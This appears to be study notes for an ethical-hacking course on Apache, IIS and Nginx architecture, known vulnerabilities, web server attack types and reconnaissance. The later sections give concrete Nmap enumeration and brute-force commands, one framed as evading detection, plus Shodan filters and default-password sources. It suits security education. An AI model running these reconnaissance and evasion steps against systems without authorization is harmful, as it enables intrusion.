		- The Apache web server is an open-source HTTP server used to deliver web content over the Internet. Apache can host websites, handle HTTP requests, and serve both static and dynamic content.
		- Components Of Apache Web Server Architecture:
			- HTTP Client: A browser or software that initiates requests to the Apache server, requesting web pages, files, or other resources.
			- HTTP Server (Core): The core module handles HTTP(S) requests and responses, interfacing with various modules to provide additional functionalities, including:
				- mod_auth: Manages user authentication, ensuring that only authorized users can access specific web resources based on configured credentials.
				- mod_ssl: Provides SSL/TLS encryption to secure communication between the server and clients.
				- mod_rewrite: Enables URL rewriting, customized URLs, and redirection based on specified rules.
				- mod_proxy: Functions as a proxy and gateway, enabling request forwarding to other servers and load balancing.
			- BMMTM Extensible Agent: Intercepts HTTP(S) requests and responses to gather detailed transaction data. It enhances monitoring and performance analysis by providing insights into interactions between clients and servers.
			- Application Server: Executes backend applications, processes data, and generates dynamic content. It functions separately from the web server that handles HTTP requests. The application server runs applications written in various programming languages (e.g., PHP, Java, Python), generating dynamic content that is subsequently served by the Apache web server.
		- Apache Vulnerabilities:

				- Attackers exploit this by sending specially crafted requests that trigger the over-read, potentially exposing sensitive data stored in adjacent memory locations.
			- DoS in HTTP/2 with Initial Window Size 0:
				- This vulnerability arises when an attacker sets the HTTP/2 initial window size to 0, preventing the server from sending data.
				- Attackers exploit this by sending requests that set the window size to 0, causing the server to wait indefinitely for updates, leading to a denial of service (DoS).
			- HTTP/2 Stream Memory Not Reclaimed Immediately on RST:
				- This vulnerability occurs when memory allocated for an HTTP/2 stream is not immediately freed upon receiving a stream reset (RST) frame.
				- Attackers exploit this by repeatedly creating and resetting streams, consuming memory without releasing it, which eventually leads to memory exhaustion and a denial of service (DoS).
			- Insecure Default Configuration:
				- This vulnerability arises from insecure default administrative credentials, which can lead to remote code execution (RCE).
				- Attackers exploit this by using default credentials to gain administrative access and execute arbitrary code.

				- Attackers can exploit this to execute arbitrary code or access sensitive information by navigating to unintended directories.
			- SQL Injection:
				- This vulnerability is caused by improper neutralization of special elements in SQL commands in the Apache Submarine Server Core.
				- Attackers can exploit this to execute arbitrary SQL queries, leading to unauthorized access, data retrieval, or database modifications.
	- IIS Web Server Architecture:
		- Internet Information Services (IIS) is a web server application developed by Microsoft that runs on a server and responds to browser requests. It supports multiple protocols, including HTTP, HTTPS (HTTP Secure), FTP (File Transfer Protocol), FTPS (FTP Secure), SMTP (Simple Mail Transfer Protocol), and NNTP (Network News Transfer Protocol).
		- IIS applications use HTML to present the user interface and compiled Visual Basic code to process requests and respond to browser events. IIS for Windows is a flexible and easy-to-manage web server designed for web hosting.
		- IIS Components (core):
			- Protocol Listeners (HTTP.sys) – Handles incoming HTTP requests.
			- World Wide Web Publishing Service (WWW Service) – Manages websites and applications.
			- Windows Process Activation Service (WAS) – Controls application pools and worker processes.
		- IIS and DLL Dependencies:
			- IIS relies on a set of dynamic link libraries (DLLs) that work in conjunction with the main server process (inetinfo.exe). These DLLs provide various functionalities, such as content indexing, server-side scripting, and web-based printing.
		- Functioning of IIS Server Components:
			- When a client browser sends an HTTP request, HTTP.sys intercepts it and retrieves configuration data from ApplicationHost.config via WAS. WAS forwards site and application pool settings to the WWW Service, which configures HTTP.sys. WAS then starts a worker process for the target application pool, which processes the request and returns the response to HTTP.sys, which delivers it to the client browser.
		- IIS Vulnerabilities:
			- Trust Boundary Violation Vulnerability:
				- This vulnerability arises from inadequate separation of privilege boundaries, allowing an unauthenticated entity to access restricted functionality in the Telerik Report Server.
				- Exploiting this flaw may enable unauthorized manipulation of server operations.
			- Authentication Bypass Vulnerability:
				- This occurs due to flaws in the authentication process, where an insecure endpoint permits unauthenticated access to restricted server functionality.
				- Attackers can exploit this vulnerability to bypass authentication and execute arbitrary code on the server.
			- CRLF Cross-Site Scripting (XSS) Vulnerability:
				- This vulnerability results from misconfigurations in the SiteMinder Web Agent for IIS Web Server.

				- Attackers can exploit this flaw to inject malicious scripts and steal sensitive information.
	- Nginx Web Server Architecture:
		- Nginx is a high-performance, scalable web server, reverse proxy, and load balancer that operates on a master-worker architecture. It employs a single-threaded, event-driven, asynchronous, and non-blocking model to efficiently manage multiple connections.
		- At its core, Nginx consists of a master process that oversees multiple worker processes, each responsible for handling client requests. This modular architecture allows extensive customization through various HTTP, stream, mail, and third-party modules. Nginx supports advanced load balancing, robust caching, SSL/TLS termination, and detailed logging. Its security features—including access control, authentication, and rate limiting—make it suitable for high-traffic and mission-critical applications.
		- Key Components of Nginx Architecture:
			- Master Process: The master process is responsible for reading and validating configuration files, creating, binding, and closing sockets, and managing worker processes. It performs administrative tasks and ensures that worker processes are properly configured and running efficiently.
			- Worker Processes: Worker processes handle client requests by accepting connections, reading and writing data, and communicating with upstream servers. Each single-threaded worker uses non-blocking I/O to handle thousands of simultaneous connections. Once a request is processed, the worker sends the response back to the client. Shared memory zones enable communication and data sharing between worker processes.
			- Proxy Cache: The proxy cache stores copies of requested content to reduce backend server load and speed up response times by serving frequently accessed content directly from memory. This enhances performance and reduces latency.
				- Cache Loader: Loads cache metadata into memory at startup, ensuring that cached content is immediately available for requests. It scans cache directories and initializes in-memory cache structures.
				- Cache Manager: Periodically checks for expired content, removes outdated or unused cache entries, and ensures the cache does not exceed its configured limits.
			- Web Server: The web server component of Nginx handles HTTP requests from clients, serves static content, and forwards dynamic content requests to application servers.
			- Application Server: The application server processes client requests by executing server-side scripts or applications and delivering dynamic content.
			- Memcached: Memcached acts as a caching layer that stores frequently accessed data in memory, reducing database query loads and enhancing response times.
		- Nginx Vulnerabilities:
			- NULL Pointer Dereference in HTTP/3:
				- This vulnerability arises due to a NULL pointer dereference in Nginx's QUIC module when handling HTTP/3 requests, causing worker processes to terminate.
				- Attackers can exploit this flaw by sending specially crafted requests to a vulnerable Nginx server, leading to a denial of service (DoS) or potential remote code execution (RCE).
			- Server-Side Request Forgery (SSRF) Vulnerability:
				- This vulnerability occurs due to SSRF in the upload link feature of mintplex-labs/anything-llm.
				- Attackers can exploit it by hosting a malicious website, enabling them to perform internal port scanning, access non-public web applications, delete arbitrary files, and carry out local file inclusion (LFI).
			- Remote Code Execution (RCE) Vulnerability:
				- This vulnerability results from exposed configuration settings in Nginx-UI.
				- Attackers can leverage it to execute remote code, escalate privileges, or disclose sensitive information.
			- Improper Certificate Validation:
				- This issue arises due to improper validation of user input in the Import Certificate feature of Nginx-UI.
				- Attackers can exploit this vulnerability to write arbitrary files, potentially compromising the system.
			- SQL Injection Vulnerability:
				- This vulnerability stems from improper neutralization of special SQL characters, allowing unsanitized user input to be appended to queries.
				- Attackers can exploit it to execute arbitrary SQL queries, leading to unauthorized access or data breaches.
			- Unauthenticated Private Key Access:
				- This vulnerability occurs due to reliance on .htaccess for security, which is ineffective on Nginx servers that do not support .htaccess files.
				- Attackers can exploit this flaw to read private keys on affected servers.
			- Excessive Memory Usage and CPU Exhaustion in HTTP/2:
				- This vulnerability results from improper memory handling and excessive CPU consumption when processing HTTP/2 requests.
				- Attackers can flood the server with HTTP/2 requests, depleting system resources and disrupting normal operations.
			- OS Command Injection in nginxWebUI:
				- This vulnerability arises due to improper handling of file arguments in the upload feature.
				- Attackers can manipulate file arguments to inject and execute OS commands remotely on the server.
			- Default File Permissions Vulnerability:
				- This vulnerability exists because the Nginx Management Suite assigns default file permissions that allow authenticated users to modify sensitive files.
				- Attackers can leverage this flaw to alter critical files in the Nginx Instance Manager and Nginx API Connectivity Manager.
- Web Server Attacks:
	- DNS Server Hijacking:
		- The Domain Name System (DNS) resolves domain names to their corresponding IP addresses. When a user queries a DNS server with a domain name, the server responds with the appropriate IP address.
		- In DNS server hijacking, an attacker compromises a DNS server and alters its mapping settings to redirect queries to a rogue DNS server. This rogue server then directs users to malicious websites controlled by the attacker. As a result, when a user enters a legitimate URL in a browser, they are unknowingly redirected to a fraudulent site.
	- DNS Amplification:
		- A recursive DNS query is a method of requesting DNS resolution, where the query passes through multiple DNS servers until the correct domain name-to-IP address mapping is found or the request fails.
		- Attackers exploit recursive DNS queries to conduct a DNS amplification attack, which generates a large volume of traffic to overwhelm a target's DNS server, leading to a Distributed Denial-of-Service (DDoS) attack.
	- Directory Traversal Attacks:
		- A directory traversal attack occurs when an attacker exploits a vulnerability in a web application's code or a misconfigured or poorly patched web server. These weaknesses can allow unauthorized access to restricted directories and sensitive files.
		- Web servers are designed to limit public access to certain directories. However, directory traversal attacks exploit HTTP vulnerabilities, enabling attackers to bypass these restrictions and execute commands outside the web server’s root directory by manipulating Uniform Resource Locators (URLs). Attackers commonly use the dot-dot-slash (../) sequence to navigate beyond the root directory and access sensitive system files. They may employ a trial-and-error approach to locate and retrieve confidential information.
		- This attack is typically carried out using a web browser or automated tools. A web server is vulnerable if it accepts user input without proper validation, allowing attackers to manipulate directory paths and gain unauthorized access.
	- Website Defacement:
		- Website defacement refers to unauthorized modifications to the content of a single web page or an entire website, altering its visual appearance. Hackers gain access to web servers and modify the hosted website by injecting code to add images, pop-ups, or text, thereby changing the site's appearance. In some cases, attackers may replace the entire website rather than just modifying a single page.
		- Defaced pages often expose visitors to propaganda, misleading information, or offensive content until the unauthorized changes are detected and fixed. Attackers use various techniques, such as SQL injection, to gain access and deface websites. Beyond altering the site's appearance, attackers may also inject malicious code to compromise visitors' devices, making them vulnerable to malware or virus infections.
		- Thus, website defacement not only damages the target organization's reputation but can also pose security risks to its visitors.
	- Web Server Misconfiguration:
		- Web server misconfiguration refers to weaknesses in web infrastructure settings that can be exploited to launch various attacks, such as directory traversal, server intrusion, and data theft.
		- Common Web Server Misconfigurations:
			- Verbose debug/error messages
			- Default or anonymous user accounts with weak credentials
			- Sample configuration and script files left accessible
			- Unrestricted remote administration functions
			- Unnecessary services enabled
			- Misconfigured or default SSL certificates
		- Examples of Web Server Misconfigurations:
			- Exposed Server Status Page: A misconfiguration may allow unrestricted access to the server status page, revealing detailed information about server usage, active hosts, and ongoing requests.
			- Verbose Error Messages: The server may display detailed error messages that reveal sensitive information, such as file paths, database queries, or system configurations, which attackers can exploit.
			- Directory Browsing Enabled (IIS Web Server): A misconfigured web.config file may enable directory browsing, allowing users to see the contents of directories, potentially exposing sensitive files.
			- Unrestricted File Uploads (IIS Web Server): The server may allow users to upload files without proper validation or security checks, enabling attackers to upload and execute malicious files (e.g., web shells), leading to remote code execution.
			- Misconfigured Root Location (Nginx Web Server): If the root location (location / {}) is missing in the Nginx configuration, it can cause undefined behaviors, potentially exposing directory listings or default server configurations.
			- Lack of Input Sanitization: Directly using user input in variables without sanitization can lead to injection attacks. All user inputs should be validated and sanitized to prevent malicious payloads from executing.
		- Properly configuring a web server is crucial to minimizing security risks and preventing unauthorized access, data breaches, and service disruptions.
	- HTTP Response-Splitting Attack:
		- An HTTP response-splitting attack is a web-based attack in which an attacker manipulates server responses by injecting new line characters into response headers along with arbitrary code. This attack exploits input validation vulnerabilities, allowing the attacker to split a server’s response into two separate responses. Common attacks facilitated by HTTP response splitting include Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and SQL Injection.
		- An attacker can exploit a vulnerable Apache HTTP server by leveraging improper input validation. By crafting a specially constructed request header, the attacker tricks the server into generating two separate HTTP responses. This manipulation enables the attacker to inject malicious content into an HTTP response header, causing the first response to redirect the user to a malicious website while the browser discards any subsequent responses.
		- Example of HTTP Response-Splitting Attack: An attacker injects a response-splitting payload into a request, causing the server to generate two responses—one for the attacker and another for an unsuspecting victim. As the victim submits credentials, the attacker requests the index page. The server then mistakenly sends the victim’s response to the attacker, granting unauthorized access to sensitive data while the victim remains unaware.
		- Proper input validation and sanitization of user-supplied data are critical in preventing HTTP response-splitting attacks.
	- Web Cache Poisoning Attack:
		- Web cache poisoning compromises the reliability of an intermediate web cache. In this attack, an attacker replaces cached content for a specific URL with malicious content. As a result, users unknowingly receive the poisoned content instead of the legitimate, secure content when accessing the cached resource.
		- The attacker manipulates the web cache by forcing the server to flush its legitimate cache and accept a specially crafted malicious request. Once stored, all users relying on that cache will receive the harmful content until the cache is cleared. Web cache poisoning attacks are possible when the web server or application has vulnerabilities such as HTTP response splitting.
	- SSH Brute Force Attack:
		- Attackers exploit the SSH protocol to establish an encrypted SSH tunnel between two hosts, allowing them to transfer unencrypted data over an insecure network. By default, SSH operates on TCP port 22. To launch an attack, an attacker scans SSH servers using automated bots, performing a port scan on TCP port 22 to identify potential vulnerabilities.
		- Using a brute-force attack, the attacker attempts to guess login credentials to gain unauthorized access to the SSH server. Once access is obtained, the attacker can leverage the SSH tunnel to transmit malware and carry out further exploitation without detection. Common tools used for SSH brute-force attacks on Linux platforms include Nmap and Ncrack.
	- FTP Brute Force with AI:
		- Attackers can leverage AI-powered technologies to enhance and automate brute-force attempts, making them more efficient and difficult to detect. AI can optimize attack strategies by predicting password patterns and adjusting attempts based on previous failures.
		- For example, an attacker use AI-driven tools to generate targeted password lists or automate attack sequences.
	- HTTP/2 Continuation Flood Attack:
		- The HTTP/2 Continuation Flood Attack exploits the way HTTP/2 handles CONTINUATION frames, leading to resource exhaustion on the target Apache server. In HTTP/2, headers that are too large to fit in a single HEADERS frame can be split into multiple frames. The initial portion of the headers is sent in a HEADERS frame, while the remaining parts follow in CONTINUATION frames.
		- Attackers exploit this mechanism by continuously sending CONTINUATION frames within a single TCP connection without completing the header sequence. This forces the Apache server to allocate excessive resources, eventually leading to a denial-of-service (DoS) condition.
		- How the HTTP/2 Continuation Flood Attack Works:
			- Establishing a Connection: The attacker initiates a TCP connection with the target Apache server.
			- Sending an Incomplete Header Sequence: The attacker sends a legitimate HEADERS frame containing initial headers for a request. More headers are expected in subsequent CONTINUATION frames.
			- Resource Allocation on the Server: Upon receiving the HEADERS frame, the Apache server allocates memory and processing resources to handle the incoming request.
			- Exploiting CONTINUATION Frames: Instead of completing the header sequence by setting the END_HEADERS flag, the attacker sends numerous CONTINUATION frames, each indicating that additional header data is forthcoming.
			- Server Resource Drain: For each CONTINUATION frame received, the server continues allocating memory and CPU resources, remaining in a state of anticipation for the completion of the header sequence.
			- Server Overload and DoS Condition: As the number of CONTINUATION frames increases, the server's resources become exhausted. This leads to performance degradation, system crashes, or complete unresponsiveness.
	- Frontjacking Attack:
		- Frontjacking is a web server attack in which an attacker injects or manipulates front-end components of a web application—such as scripts or HTML elements—to hijack the user interface or user interactions. This attack often targets poorly configured Nginx reverse proxy servers in shared hosting environments by exploiting vulnerabilities such as CRLF injection, HTTP request header injection, and XSS (Cross-Site Scripting).
		- Attackers take advantage of misconfigurations in the reverse proxy, such as improper sanitization of $uri and $document_uri variables, to inject a malicious Host header. This manipulation alters the execution flow of the front-end reverse proxy, replacing the intended backend server with an attacker-controlled server.
		- As a result, attackers can: Display malicious content, Redirect users to phishing websites, Execute reflected XSS and other injection payloads, Inject harmful scripts to compromise users.
		- How Frontjacking Attack Works:
			- Injection of a Malicious Host Header: The attacker crafts an HTTP request containing CRLF characters in the URI to inject a malicious Host header and sends it to the vulnerable reverse proxy server.
			- Processing by the Vulnerable Reverse Proxy: The reverse proxy fails to properly sanitize the injected Host header and processes the malicious request.
			- Redirection to an Attacker-Controlled Server: Instead of routing the request to the legitimate backend server, the proxy redirects traffic to the attacker's server.
			- Delivery of Malicious Content: The attacker-controlled server responds with phishing pages, malware, or injected scripts, compromising users who access the affected web application.
	- Other Web Server Attacks:
		- Web Server Password Cracking:
			- Password cracking is one of the most common methods used to gain unauthorized access to a web server by exploiting weak or flawed authentication mechanisms. Attackers employ different methods to facilitate password cracking, including social engineering, spoofing, phishing, Trojan horses, viruses, wiretapping, and keystroke logging.
			- Weak or commonly used passwords are often targeted. Some of the most frequently compromised passwords include "password," "root," "administrator," "admin," "demo," "test," "guest," "qwerty," and personal identifiers like pet names.
			- Common Targets of Web Server Password Cracking: SMTP and FTP servers, Web shares, SSH tunnels, Web form authentication.
			- Web Server Password Cracking Techniques:
				- Guessing: This is one of the most common methods of password cracking. The attacker manually guesses possible passwords or uses automated tools with dictionary files. Many people use easily memorable but weak passwords, such as pet names, loved ones' names, license plate numbers, birth dates, or common words like "QWERTY," "password," "admin," etc.
				- Dictionary Attack: A dictionary attack relies on a predefined list of words and systematically tests them as potential passwords. An automated program enters each word from the list to check if it matches the password. While effective against simple passwords, this method is less successful if the password includes special characters, numbers, or symbols. Compared to a brute-force attack, a dictionary attack is faster and less resource-intensive.
				- Brute-Force Attack: In this method, all possible character combinations are systematically tested, including uppercase letters (A–Z), lowercase letters (a–z), numbers (0–9), and special characters. While effective for short passwords, brute-force attacks can take months or even years to crack complex passwords with multiple character types.
				- Hybrid Attack: A hybrid attack combines dictionary and brute-force techniques, making it more powerful than either method alone. It not only tests dictionary words but also appends numbers and symbols to increase the chances of success. This approach improves efficiency in cracking passwords, especially those that include minor modifications of common words (e.g., "password123" or "admin!").
		- DoS/DDoS Attacks:
			- A Denial-of-Service (DoS) or Distributed Denial-of-Service (DDoS) attack floods a target with an overwhelming number of fake requests, causing it to crash or become inaccessible to legitimate users. Attackers use these attacks to disrupt web servers, rendering them unavailable.
			- Web server DoS/DDoS attacks often target high-profile systems, including bank servers, credit card payment gateways, and root name servers. By overwhelming the server with traffic, attackers deplete its resources, causing downtime or severe performance degradation.
			- To crash a web server or disrupt its application, attackers exploit the following system resources:
				- Network bandwidth: Overloading the network with excessive traffic
				- Server memory: Consuming RAM to slow down or crash processes
				- Application exception handling mechanisms: Exploiting errors to cause failures
				- CPU usage: Overloading the processor with excessive computations
				- Hard disk space: Filling up storage with unnecessary data
				- Database space: Overloading databases to slow or crash operations
			- Mitigation strategies include implementing firewalls, rate limiting, load balancing, and DDoS protection services to prevent or minimize the impact of such attacks.
		- Man-in-the-Middle (MITM) Attack:
			- A Man-in-the-Middle (MITM) attack, also known as a Manipulator-in-the-Middle attack, allows an attacker to intercept and alter communications between an end user and a web server. By eavesdropping on or intruding into the connection, the attacker can steal sensitive information, such as online banking details, usernames, and passwords, that are transmitted over the internet.
			- In an MITM or sniffing attack, the attacker intercepts or modifies messages exchanged between the user and the web server. One common method involves tricking the victim into connecting to a malicious proxy that the attacker controls. If the victim accepts the connection, all communication between the user and the web server passes through the attacker, allowing them to steal sensitive data.
			- To prevent MITM attacks, users and organizations should implement encryption (TLS/SSL), strong authentication mechanisms, VPNs, and secure network configurations to protect communications.
		- Phishing Attacks:
			- A phishing attack occurs when an attacker deceives a user into submitting login credentials on a fake website that appears legitimate but is actually controlled by the attacker. The user is then unknowingly redirected to a malicious site hosted on the attacker's web server.
			- Attackers commonly execute phishing attacks by sending emails containing malicious links that trick users into clicking them. These links lead to fraudulent websites designed to mimic trusted platforms, such as banking portals, social media sites, or corporate login pages. Once the victim enters sensitive information—such as usernames, passwords, bank account details, or Social Security numbers—the attacker captures and stores the data.
			- Using the stolen credentials, the attacker may later gain unauthorized access to the legitimate website, impersonating the victim to perform malicious actions, such as stealing funds, accessing confidential data, or spreading further attacks.
			- Mitigation strategies include email filtering, multi-factor authentication (MFA), SSL/TLS encryption, and user awareness training to help prevent phishing attacks.
		- Web Application Attacks:
			- Vulnerabilities in web applications running on a web server create significant attack vectors that can compromise the security of the server. Even if a web server is securely configured and protected by network security measures such as firewalls, a poorly coded web application can serve as an entry point for attackers. If developers fail to implement secure coding practices, attackers may exploit vulnerabilities to compromise both the web application and the underlying server.
			- To mitigate these attacks, developers should implement secure coding practices, input validation, encryption, access controls, and web application firewalls (WAFs). Regular security audits and vulnerability assessments can further help protect web applications and web servers from exploitation.
			- Common Web Application Attacks:
				- Server-Side Request Forgery (SSRF) Attack: Attackers exploit SSRF vulnerabilities in public-facing web applications by sending maliciously crafted requests to internal or backend servers. Since these requests originate from the web server, the backend system trusts them, potentially exposing sensitive data.
				- Parameter/Form Tampering: Attackers manipulate parameters exchanged between the client and server to alter user credentials, permissions, and pricing information in applications. This can lead to unauthorized access or financial exploitation.
				- Cookie Tampering: By modifying persistent and non-persistent cookies, attackers can manipulate session data and bypass authentication mechanisms. Various tools are available to assist in modifying cookies for exploitation.
				- Unvalidated Input and File Injection Attacks: Attackers submit malicious input or inject files into a web application to exploit security gaps, potentially leading to code execution or data breaches.
				- Session Hijacking: Attackers steal, predict, or manipulate session tokens to gain unauthorized access to an authenticated user's session. This allows them to impersonate users and perform malicious actions.
				- SQL Injection (SQLi) Attacks: SQL injection exploits database vulnerabilities by injecting malicious SQL code into input fields. When executed, this code can manipulate or extract sensitive data from the database.
				- Directory Traversal: Attackers manipulate URLs to access restricted directories and execute unauthorized commands outside the web server’s root directory, potentially exposing confidential files.
				- Denial-of-Service (DoS) Attack: A DoS attack overloads the server with excessive requests, causing service disruptions and making the website unavailable to legitimate users.
				- Cross-Site Scripting (XSS) Attacks: Attackers inject malicious scripts (JavaScript, HTML, etc.) into web pages viewed by other users, enabling them to steal credentials, hijack sessions, or redirect victims to malicious websites.
				- Buffer Overflow Attacks: When a web application fails to properly manage data input, attackers can flood it with excessive data, causing crashes or unpredictable behavior that may expose vulnerabilities.
				- Cross-Site Request Forgery (CSRF) Attack: Attackers exploit the trust of authenticated users by tricking them into executing unauthorized commands on a web server, often without their knowledge.
				- Command Injection Attacks: By injecting malicious commands into form fields or insecure inputs, attackers can alter web content or execute unauthorized system commands.
				- Source Code Disclosure: Due to script misconfigurations or typographical errors, attackers may gain access to source code containing database credentials, secret keys, or other sensitive information, compromising the web server.
- Web Server Attack Methodology:
	- Information Gathering:
		- Information gathering is the first and one of the most crucial steps in hacking a target web server. During this phase, an attacker collects as much information as possible about the target server using various tools and techniques. The information gathered during this step helps the attacker assess the security posture of the web server.
		- Attackers may search the internet, newsgroups, bulletin boards, and other sources to gather information about the target organization. Tools such as Whois and Whois Lookup can be used to extract details such as the target's domain name, IP address, and autonomous system number.
		- Information Gathering Tools:
			- who.is (who.is): who.is is a platform designed to perform a variety of Whois lookup functions. It allows users to perform domain Whois searches, Whois IP lookups, and Whois database searches to obtain relevant information about domain registration and availability.
			- Whois Lookup (whois.domaintools.com)
			- Whois (www.whois.com)
			- Domain Dossier (centralops.net)
			- Subdomain Finder (pentest-tools.com)
		- Information Gathering from the Robots.txt File:
			- The robots.txt file contains a list of web server directories and files that the website owner wants to hide from web crawlers. It is primarily used to guide search engine bots on which pages should or should not be indexed. However, a poorly configured robots.txt file can unintentionally expose sensitive directories and files to attackers.
			- If confidential files and directories are indexed, an attacker may easily obtain sensitive information such as passwords, email addresses, hidden links, and membership areas. Even if a website owner attempts to restrict certain pages from being indexed, an attacker can still access the robots.txt file and identify restricted files or directories. This can provide valuable insights into the website’s structure and security vulnerabilities.
			- An attacker can simply request the robots.txt file by entering URL/robots.txt in a browser’s address bar to view its contents. Additionally, they can use tools such as Wget to download the robots.txt file and analyze it for sensitive information, including the root directory structure and content management system (CMS) details of the target website.
	- Web Server Footprinting/Banner Grabbing:
		- Web server footprinting allows an attacker to gather valuable system-level data such as account details, operating systems (OSs), software versions, server names, and database schema details. By analyzing the collected data, attackers can assess the security posture of a web server and identify potential entry points for further exploitation.
		- The Telnet utility can be used to footprint a web server and obtain information such as the server name, server type, OS, and running applications. Additionally, footprinting tools such as httprecon, Uniscan, and Netcraft can be used to extract information from a target server.
		- These tools help attackers determine critical details, including remote access capabilities, open ports, available services, and potential security vulnerabilities.
		- Web Server Footprinting Tools:
			- Netcat (netcat.sourceforge.net):
				- Netcat is a networking utility that reads and writes data across network connections using the TCP/IP protocol. It is a reliable back-end tool that can be used directly or integrated into scripts and other programs. Additionally, Netcat serves as a network debugging and exploration tool.
			- Telnet (learn.microsoft.com):
				- Telnet is a client-server network protocol commonly used on the Internet and local area networks (LANs) to establish remote login sessions. It allows a terminal on one computer to connect to another system, emulating a direct session.
				- However, Telnet has significant security vulnerabilities: It does not encrypt data sent through the connection and It lacks a robust authentication mechanism.
				- Due to these weaknesses, attackers can exploit Telnet to perform banner-grabbing attacks, probing HTTP servers to retrieve server details from HTTP response headers.
			- httprecon (www.computec.ch):
				- httprecon is an advanced web server fingerprinting tool. It performs banner grabbing, status code enumeration, and header ordering analysis on the target web server, providing accurate fingerprinting information.
				- httprecon executes various header analysis test cases on the target web server, including:
					- A legitimate GET request for an existing resource
					- An excessively long GET request (a Uniform Resource Identifier (URI) >1024 bytes)
					- A standard GET request for a non-existing resource
					- A standard HEAD request for an existing resource
					- Enumeration with OPTIONS, if allowed
					- The DELETE HTTP method, which is usually not permitted
					- The TEST HTTP method, which is undefined
					- The protocol version HTTP/9.8, which does not exist
					- A GET request containing attack patterns (e.g., ../ and %%)
			- Uniscan (sourceforge.net):
				- Uniscan is a versatile web server fingerprinting tool that goes beyond basic commands such as ping, traceroute, and nslookup. It conducts static, dynamic, and stress tests on web servers.
				- In addition to scanning websites, Uniscan performs automated Bing and Google searches for specific IP addresses and compiles all the collected data into a comprehensive report file for further analysis.
			- Netcraft (www.netcraft.com)
			- ID Serve (www.grc.com)
			- Nmap (nmap.org)
			- Ghost Eye (github.com)
			- Skipfish (code.google.com)
		- IIS Information Gathering Using Shodan:
			- Gathering information on IIS (Internet Information Services) servers can provide attackers with crucial details that aid in planning and executing further attacks. By identifying the IIS version in use, attackers can match known vulnerabilities to specific versions, making exploitation easier. Additionally, information such as open ports, running services, and server configurations can expose security weaknesses.
			- A detailed understanding of the IIS server environment allows attackers to craft targeted attacks. For example, if the gathered data indicates that a particular server runs an outdated IIS version, attackers may deploy exploits targeting known vulnerabilities associated with that version.
			- To gather such information, attackers use tools like Shodan, a powerful search engine designed to scan and index internet-connected devices, including IIS servers. Shodan enables attackers to efficiently collect data that enhances their ability to perform targeted attacks.
			- Shodan Search Filters for Information Gathering:
				- Identify IIS servers with SSL certificates issued to "Company Inc.": ssl:"Company Inc." http.title:"IIS"
				- Locate IIS servers with SSL certificates where the common name (CN) is "company.in": ssl.cert.subject.CN:"company.in" http.title:"IIS"
				- Find IIS servers located in the United States: http.title:"IIS Windows Server" country:"US"
				- Locate IIS7 servers running on port 80: http.title:"IIS7" port:80
			- Attackers can analyze Shodan search results to extract information such as IP addresses, open ports, running services, and IIS version details. By clicking on individual results, they can obtain more in-depth data, including HTTP headers, SSL certificate details, and additional metadata. Furthermore, Shodan's export feature allows attackers to save collected data in formats like CSV or JSON for further analysis.
		- Abusing Apache mod_userdir to Enumerate User Accounts:
			- Attackers can exploit Apache’s mod_userdir module to enumerate user accounts on a web server. This module allows access to user directories using URIs formatted as /~username/. Using the Nmap tool, attackers can identify valid usernames and obtain valuable information, which can then be leveraged for further attacks, such as brute-forcing or targeted phishing.
			- Enumerating User Accounts from an Apache Server:
				- Perform an Initial Scan to Enumerate Valid Users:
					- Run the following command to enumerate valid users from a target web server with mod_userdir enabled: nmap -p80 --script http-userdir-enum <target>
					- This command scans the target on port 80 using the http-userdir-enum script. If mod_userdir is enabled, the script uses the default word list usernames.lst located at /nselib/data/ and displays any discovered usernames.
				- Perform a Customized Scan:
					- A custom list of potential usernames can improve accuracy and effectiveness. Use the following command with a custom word list <Wordlist>.txt: nmap -p80 --script http-userdir-enum --script-args userdir.users=<Wordlist>.txt <target>
					- This command utilizes the specified .txt file as a source of usernames and tests them against the target server.
				- Bypass Detection with a Custom User-Agent:
					- Some security systems detect and block Nmap requests due to its default user-agent string. To bypass such detection, specify a custom user-agent: nmap -p80 --script http-brute --script-args http.useragent="<User_Agent>" <target>
					- This command modifies the HTTP user-agent string used by Nmap, making the traffic appear to originate from a standard web browser rather than a scanning tool.
		- Enumerating Web Server Information Using Nmap:
			- Nmap, along with the Nmap Scripting Engine (NSE), can extract valuable information from a target web server. NSE provides scripts that help attackers gather various types of useful data about the target system. The Nmap commands and NSE scripts can be used for reconnaissance.
			- Nmap Commands for Extracting Web Server Information:
				- Discover virtual domains with hostmap: nmap --script hostmap-bfk <host>
				- Detect a vulnerable server using the TRACE method: nmap --script http-trace -p80 localhost
				- Harvest email accounts using http-google-email: nmap --script http-google-email <host>
				- Enumerate users using http-userdir-enum: nmap -p80 --script http-userdir-enum localhost
				- Detect HTTP TRACE: nmap -p80 --script http-trace <host>
				- Check if the web server is protected by a WAF or IPS: nmap -p80 --script http-waf-detect --script-args="http-waf-detect.uri=/testphp.vulnweb.com/artists.php,http-waf-detect.detectBodyChanges" www.modsecurity.org
				- Fingerprint a Web Application Firewall (WAF): nmap --script=http-waf-fingerprint -p80,443 <host>
				- Enumerate common web applications: nmap --script http-enum -p80 <host>
				- Obtain robots.txt file: nmap -p80 --script http-robots.txt <host>
				- Service and OS detection on a target: nmap -sV -O -p <target IP address>
				- Enumerate web applications: nmap -sV --script http-enum <target IP address>
				- Check for FrontPage login: nmap <target IP address> -p 80 --script=http-frontpage-login
				- Check for password file exposure: nmap --script http-passwd --script-args http-passwd.root=/ <target IP address>
		- Finding Default Credentials of Web Server:
			- Administrators and security personnel use administrative interfaces to securely configure, manage, and monitor web application servers. Many web server administrative interfaces are publicly accessible and located in the root directory. However, these credentials are often not properly configured and remain set to default.
			- Attackers attempt to identify the running administrative interface of a target web server by performing port scanning. If an attacker successfully exploits default credentials, they can gain access to the administrative interface, compromise the web server, and exploit the main web application.
			- Once they identify the interface, they use the following techniques to find default login credentials:
				- Consult administrative interface documentation to identify default passwords.
				- Use Metasploit’s built-in database to scan the server for known credentials.
				- Attempt password-guessing and brute-force attacks to gain unauthorized access.
				- Leverage online resources such as:
					- CIRT.net: A database of default passwords, credentials, and ports
					- FortyPoundHead.com: A resource for identifying default passwords
					- www.fortypoundhead.com
					- www.defaultpassword.com
					- default-password.info
					- www.routerpasswords.com
		- Finding Default Content on Web Server:
			- Many web application servers contain default content and functionalities that attackers can exploit.
			- Common default elements that attackers seek to identify in web servers:
				- Administrative Debugging and Testing Functionalities: Web servers often include debugging, diagnostic, and testing features for administrators. These features provide valuable configuration details and runtime state information about the server and its applications, making them prime targets for attackers.
